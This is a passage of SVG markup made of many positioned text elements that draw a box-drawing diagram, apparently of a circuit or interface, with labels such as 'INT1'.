<text text-anchor='middle' x='216' y='612' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='216' y='644' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='216' y='676' fill='currentColor' style='font-size:1em'>O</text>
<text text-anchor='middle' x='216' y='708' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='216' y='740' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='216' y='772' fill='currentColor' style='font-size:1em'>O</text>
<text text-anchor='middle' x='216' y='804' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='216' y='836' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='216' y='868' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='216' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='216' y='964' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='224' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='224' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='224' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='224' y='244' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='224' y='276' fill='currentColor' style='font-size:1em'>I</text>
<text text-anchor='middle' x='224' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='224' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='224' y='372' fill='currentColor' style='font-size:1em'>I</text>
<text text-anchor='middle' x='224' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='224' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='224' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='224' y='516' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='224' y='580' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='224' y='644' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='224' y='676' fill='currentColor' style='font-size:1em'>I</text>
<text text-anchor='middle' x='224' y='708' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='224' y='740' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='224' y='772' fill='currentColor' style='font-size:1em'>I</text>
<text text-anchor='middle' x='224' y='804' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='224' y='836' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='224' y='868' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='224' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='224' y='964' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='232' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='232' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='232' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='232' y='212' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='232' y='244' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='232' y='276' fill='currentColor' style='font-size:1em'>N</text>
<text text-anchor='middle' x='232' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='232' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='232' y='372' fill='currentColor' style='font-size:1em'>N</text>
<text text-anchor='middle' x='232' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='232' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='232' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='232' y='516' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='232' y='580' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='232' y='612' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='232' y='644' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='232' y='676' fill='currentColor' style='font-size:1em'>N</text>
<text text-anchor='middle' x='232' y='708' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='232' y='740' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='232' y='772' fill='currentColor' style='font-size:1em'>N</text>
<text text-anchor='middle' x='232' y='804' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='232' y='836' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='232' y='868' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='232' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='232' y='964' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='240' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='240' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='240' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='240' y='244' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='240' y='276' fill='currentColor' style='font-size:1em'>T</text>
<text text-anchor='middle' x='240' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='240' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='240' y='372' fill='currentColor' style='font-size:1em'>T</text>
<text text-anchor='middle' x='240' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='240' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='240' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='240' y='516' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='240' y='580' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='240' y='644' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='240' y='676' fill='currentColor' style='font-size:1em'>T</text>
<text text-anchor='middle' x='240' y='708' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='240' y='740' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='240' y='772' fill='currentColor' style='font-size:1em'>T</text>
<text text-anchor='middle' x='240' y='804' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='240' y='836' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='240' y='868' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='240' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='240' y='964' fill='currentColor' style='font-size:1em'>i</text>
<text text-anchor='middle' x='248' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='248' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='248' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='248' y='244' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='248' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='248' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='248' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='248' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='248' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='248' y='516' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='248' y='580' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='248' y='644' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='248' y='708' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='248' y='740' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='248' y='804' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='248' y='836' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='248' y='868' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='248' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='248' y='964' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='256' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='256' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='256' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='256' y='244' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='256' y='276' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='256' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='256' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='256' y='372' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='256' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='256' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='256' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='256' y='516' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='256' y='580' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='256' y='644' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='256' y='676' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='256' y='708' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='256' y='740' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='256' y='772' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='256' y='804' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='256' y='836' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='256' y='868' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='256' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='256' y='964' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='264' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='264' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='264' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='264' y='244' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='264' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='264' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='264' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='264' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='264' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='264' y='516' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='264' y='580' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='264' y='644' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='264' y='708' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='264' y='740' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='264' y='804' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='264' y='836' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='264' y='868' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='264' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='264' y='964' fill='currentColor' style='font-size:1em'>s</text>
<text text-anchor='middle' x='272' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='272' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='272' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='272' y='244' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='272' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='272' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='272' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='272' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='272' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='272' y='516' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='272' y='580' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='272' y='644' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='272' y='708' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='272' y='740' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='272' y='804' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='272' y='836' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='272' y='868' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='272' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='272' y='964' fill='currentColor' style='font-size:1em'>,</text>
<text text-anchor='middle' x='280' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='280' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='280' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='280' y='244' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='280' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='280' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='280' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='280' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='280' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='280' y='516' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='280' y='580' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='280' y='644' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='280' y='708' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='280' y='740' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='280' y='804' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='280' y='836' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='280' y='868' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='280' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='288' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='288' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='288' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='288' y='244' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='288' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='288' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='288' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='288' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='288' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='288' y='516' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='288' y='580' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='288' y='644' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='288' y='708' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='288' y='740' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='288' y='804' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='288' y='836' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='288' y='868' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='288' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='288' y='964' fill='currentColor' style='font-size:1em'>i</text>
<text text-anchor='middle' x='296' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='296' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='296' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='296' y='244' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='296' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='296' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='296' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='296' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='296' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='296' y='516' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='296' y='580' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='296' y='644' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='296' y='708' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='296' y='740' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='296' y='804' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='296' y='836' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='296' y='868' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='296' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='296' y='964' fill='currentColor' style='font-size:1em'>n</text>
<text text-anchor='middle' x='304' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='304' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='304' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='304' y='244' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='304' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='304' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='304' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='304' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='304' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='304' y='516' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='304' y='580' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='304' y='644' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='304' y='708' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='304' y='740' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='304' y='804' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='304' y='836' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='304' y='868' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='304' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='304' y='964' fill='currentColor' style='font-size:1em'>t</text>
<text text-anchor='middle' x='312' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='312' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='312' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='312' y='244' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='312' y='308' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='312' y='340' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='312' y='404' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='312' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='312' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='312' y='516' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='312' y='580' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='312' y='644' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='312' y='708' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='312' y='740' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='312' y='804' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='312' y='836' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='312' y='868' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='312' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='312' y='964' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='320' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='320' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='320' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='320' y='244' fill='currentColor' style='font-size:1em'>┐</text>
<text text-anchor='middle' x='320' y='260' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='320' y='276' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='320' y='292' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='320' y='308' fill='currentColor' style='font-size:1em'>┘</text>
<text text-anchor='middle' x='320' y='340' fill='currentColor' style='font-size:1em'>┐</text>
<text text-anchor='middle' x='320' y='356' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='320' y='372' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='320' y='388' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='320' y='404' fill='currentColor' style='font-size:1em'>┘</text>
<text text-anchor='middle' x='320' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='320' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='320' y='516' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='320' y='580' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='320' y='644' fill='currentColor' style='font-size:1em'>┐</text>
<text text-anchor='middle' x='320' y='660' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='320' y='676' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='320' y='692' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='320' y='708' fill='currentColor' style='font-size:1em'>┘</text>
<text text-anchor='middle' x='320' y='740' fill='currentColor' style='font-size:1em'>┐</text>
<text text-anchor='middle' x='320' y='756' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='320' y='772' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='320' y='788' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='320' y='804' fill='currentColor' style='font-size:1em'>┘</text>
<text text-anchor='middle' x='320' y='836' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='320' y='868' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='320' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='320' y='964' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='328' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='328' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='328' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='328' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='328' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='328' y='516' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='328' y='580' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='328' y='836' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='328' y='868' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='328' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='328' y='964' fill='currentColor' style='font-size:1em'>f</text>
<text text-anchor='middle' x='336' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='336' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='336' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='336' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='336' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='336' y='516' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='336' y='580' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='336' y='836' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='336' y='868' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='336' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='336' y='964' fill='currentColor' style='font-size:1em'>a</text>
<text text-anchor='middle' x='344' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='344' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='344' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='344' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='344' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='344' y='516' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='344' y='580' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='344' y='836' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='344' y='868' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='344' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='344' y='964' fill='currentColor' style='font-size:1em'>c</text>
<text text-anchor='middle' x='352' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='352' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='352' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='352' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='352' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='352' y='516' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='352' y='580' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='352' y='836' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='352' y='868' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='352' y='932' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='352' y='964' fill='currentColor' style='font-size:1em'>e</text>
<text text-anchor='middle' x='360' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='360' y='116' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='360' y='180' fill='currentColor' style='font-size:1em'>┐</text>
<text text-anchor='middle' x='360' y='196' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='360' y='212' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='360' y='228' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='360' y='244' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='360' y='260' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='360' y='276' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='360' y='292' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='360' y='308' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='360' y='324' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='360' y='340' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='360' y='356' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='360' y='372' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='360' y='388' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='360' y='404' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='360' y='420' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='360' y='436' fill='currentColor' style='font-size:1em'>┘</text>
<text text-anchor='middle' x='360' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='360' y='516' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='360' y='580' fill='currentColor' style='font-size:1em'>┐</text>
<text text-anchor='middle' x='360' y='596' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='360' y='612' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='360' y='628' fill='currentColor' style='font-size:1em'>│</text>
